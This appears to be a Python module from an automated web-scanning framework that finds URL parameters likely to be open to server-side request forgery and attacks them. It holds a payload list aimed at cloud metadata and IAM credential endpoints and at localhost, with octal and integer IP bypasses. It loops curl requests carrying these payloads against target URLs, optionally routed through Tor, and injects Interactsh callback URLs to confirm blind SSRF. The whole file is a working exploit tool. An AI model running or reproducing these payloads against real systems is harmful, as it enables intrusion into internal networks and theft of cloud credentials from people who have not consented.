#!/usr/bin/env python3
# modules/step11_ssrf.py — SSRF with OOB/Interactsh + M7 SSRF Engine
import os
from core.utils import count_lines, safe_read

class SSRFStep:
    def __init__(self, p): self.p=p; self.log=p.log; self.f=p.files

    def run(self):
        urls     = self.f["urls"]
        ssrf_out = self.f["ssrf_params"]

        # GF filter
        self.p.shell(f"cat {urls} 2>/dev/null | gf ssrf > {ssrf_out} 2>/dev/null",
                     label="gf ssrf filter")

        n = count_lines(ssrf_out)
        if n == 0:
            self.log.warn("No SSRF params found"); return

        probe_out = os.path.join(self.p.out, f"{self.p.prefix}_ssrf_probe.txt")

        # ── Standard SSRF payloads (internal/cloud metadata) ──────────
        SSRF_PAYLOADS = [
            "http://169.254.169.254/latest/meta-data/",           # AWS
            "http://169.254.169.254/latest/meta-data/iam/",       # AWS IAM
            "http://metadata.google.internal/computeMetadata/v1/", # GCP
            "http://169.254.169.254/metadata/v1/",                 # DigitalOcean
            "http://169.254.169.254/metadata/instance",            # Azure
            "http://100.100.100.200/latest/meta-data/",           # Alibaba
            "http://127.0.0.1:80/",
            "http://127.0.0.1:8080/",
            "http://127.0.0.1:8443/",
            "http://localhost/",
            "http://0.0.0.0:80/",
            "http://[::1]/",
            "http://0177.0.0.1/",    # Octal bypass
            "http://2130706433/",    # Integer bypass
        ]

        payload_file = "/tmp/m7_ssrf_payloads.txt"
        with open(payload_file,"w") as f:
            f.write("\n".join(SSRF_PAYLOADS)+"\n")

        # Test each param with each payload
        self.p.shell(
            f"cat {ssrf_out} | head -50 | while IFS= read -r u; do "
            f"  while IFS= read -r pl; do "
            f"    mod=$(echo \"$u\" | sed \"s|=http[^&]*|=$pl|g; s|=https[^&]*|=$pl|g\"); "
            f"    code=$(curl -sk -o /dev/null -w '%{{http_code}}' --connect-timeout 5 \"$mod\"); "
            f"    [ \"$code\" = \"200\" ] && echo \"[POSSIBLE] $code $mod\" >> {probe_out}; "
            f"    [ \"$code\" = \"500\" ] && echo \"[INTERESTING-500] $mod\" >> {probe_out}; "
            f"  done < {payload_file}; "
            f"done",
            label="SSRF payload probe", use_tor=bool(self.p.tor), tool_name="ssrf_engine")

        # ── OOB/Interactsh blind SSRF ─────────────────────────────────
        if self.p.oob:
            self._blind_ssrf_oob(ssrf_out, probe_out)

        # Parse results
        confirmed = 0
        if os.path.isfile(probe_out):
            with open(probe_out) as f:
                lines = f.readlines()
            for line in lines:
                if "[POSSIBLE]" in line or "BLIND_SSRF" in line:
                    confirmed += 1
                    self.p.add_finding("high","SSRF",line.strip(),"SSRF probe response","ssrf_engine")

        self.log.success(f"SSRF: {confirmed} potential findings")

    def _blind_ssrf_oob(self, params_file, probe_out):
        """OOB blind SSRF via Interactsh — detects when server makes callback."""
        params = safe_read(params_file)[:30]
        for url in params:
            oob_url  = self.p.oob.get_payload("ssrf", url)
            oob_url2 = oob_url.replace("http://","http%3A%2F%2F")
            oob_url3 = oob_url.replace("http://","https://")

            for encoded in [oob_url, oob_url2, oob_url3]:
                mod = url
                import re
                mod = re.sub(r'=https?://[^&]+', f'={encoded}', mod)
                mod = re.sub(r'=(url|src|href|redirect|next|link|path|return)[^&]*',
                             f'=\\1={encoded}', mod, flags=re.IGNORECASE)
                self.p.shell(
                    f"curl -sk --connect-timeout 8 '{mod}' > /dev/null 2>&1",
                    use_tor=bool(self.p.tor))

        self.log.info("OOB SSRF payloads injected — waiting for callbacks...")
